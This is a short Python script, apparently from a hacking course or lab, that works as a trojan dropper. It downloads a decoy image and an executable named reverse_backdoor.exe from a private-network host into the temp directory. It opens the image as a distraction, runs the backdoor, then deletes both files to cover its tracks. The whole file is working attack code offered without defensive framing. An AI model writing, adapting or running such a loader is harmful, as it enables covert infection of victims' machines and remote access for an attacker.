import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.98.149/evil-files/defcon.png")
subprocess.Popen("defcon.png", shell=True)

download("http://192.168.98.149/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("defcon.png")
os.remove("reverse_backdoor.exe")